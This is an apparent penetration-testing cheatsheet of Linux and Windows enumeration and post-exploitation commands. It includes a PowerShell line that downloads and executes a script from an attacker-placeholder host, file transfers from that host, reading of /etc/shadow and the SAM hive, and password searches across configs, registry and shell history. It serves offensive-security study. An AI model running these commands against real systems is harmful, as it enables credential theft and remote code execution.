---
tags: [reference, commands, cheatsheet, linux, windows]
---

# Command Cheatsheet

## Linux Essentials

### File Operations
```bash
# Find files
find / -name "flag.txt" 2>/dev/null
find / -perm -4000 -type f 2>/dev/null      # SUID
find / -writable -type f 2>/dev/null | grep -v proc
find / -newer /tmp/ref -type f 2>/dev/null  # Modified recently

# Transfer files
python3 -m http.server 8080
wget http://<lhost>:8080/file
curl http://<lhost>:8080/file -o /tmp/file

# Compress/archive
tar czf loot.tar.gz /path/
tar xzf loot.tar.gz
zip -r loot.zip /path/

# Base64 encode/decode
base64 /etc/shadow
base64 -d <<< "<encoded>"

# Hex dump
xxd file | head
od -c file | head
```

### Process / Network
```bash
ps aux | grep <name>
ss -tlnp              # Listening TCP ports
ss -ulnp              # Listening UDP ports
netstat -ano          # All connections
lsof -i :<port>       # Who's using a port
kill -9 <pid>
```

### User / Permissions
```bash
id; whoami; groups
cat /etc/passwd | awk -F: '$7!="/sbin/nologin"{print $1}'
cat /etc/shadow
cat /etc/sudoers
last; lastlog; w       # Login history
```

### Useful One-Liners
```bash
# Search for passwords in files
grep -rn --include="*.conf" --include="*.ini" --include="*.php" "password\|passwd\|secret" /var /etc /home 2>/dev/null

# World-writable directories
find / -type d -writable 2>/dev/null | grep -v proc

# Recently modified files
find / -mmin -10 -type f 2>/dev/null | grep -v proc

# Mounted filesystems
mount | grep -E "ext4|nfs|cifs"
cat /etc/fstab

# Environment
env; printenv; export
```

## Windows Essentials

### Recon
```cmd
whoami /all
systeminfo
net user; net localgroup administrators
ipconfig /all; route print; arp -a
netstat -ano
tasklist /SVC
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

### File Operations
```powershell
# Find files
Get-ChildItem -Recurse -Filter "*.txt" C:\Users\ 2>$null
dir /s /b C:\Users\*pass* C:\Users\*cred* 2>/dev/null

# Read file
Get-Content C:\file.txt
type C:\file.txt

# Download file
(New-Object Net.WebClient).DownloadFile('http://<lhost>/file.exe','C:\Temp\file.exe')
IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/script.ps1')
certutil -urlcache -split -f "http://<lhost>/file" C:\Temp\file

# Base64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file"))
[IO.File]::WriteAllBytes("C:\out",[Convert]::FromBase64String("<encoded>"))
```

### Registry
```cmd
# Read
reg query HKLM\SAM
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# Auto-run persistence check
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Search for passwords
reg query HKLM /f password /t REG_SZ /s 2>/dev/null
reg query HKCU /f password /t REG_SZ /s 2>/dev/null
```

### WMIC
```cmd
wmic useraccount list full
wmic process list brief
wmic service list brief
wmic startup list full
wmic product get name,version
wmic qfe list          # Installed patches
```

## Quick Wins Checklist

```
Linux:
[ ] sudo -l
[ ] find / -perm -4000 2>/dev/null
[ ] cat /etc/crontab; ls /etc/cron.*
[ ] getcap -r / 2>/dev/null
[ ] cat ~/.bash_history
[ ] env

Windows:
[ ] whoami /priv   (SeImpersonatePrivilege?)
[ ] cmdkey /list
[ ] type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
[ ] reg query HKLM /f password /t REG_SZ /s
[ ] dir /s /b C:\Users\*pass* C:\Users\*cred*
```

## Related

- [[05-Post-Exploitation/Linux-PrivEsc/INDEX]] — Linux PrivEsc full guide
- [[05-Post-Exploitation/Windows-PrivEsc/INDEX]] — Windows PrivEsc full guide
- [[00-Quick-Reference/Reverse-Shells]] — Shell one-liners
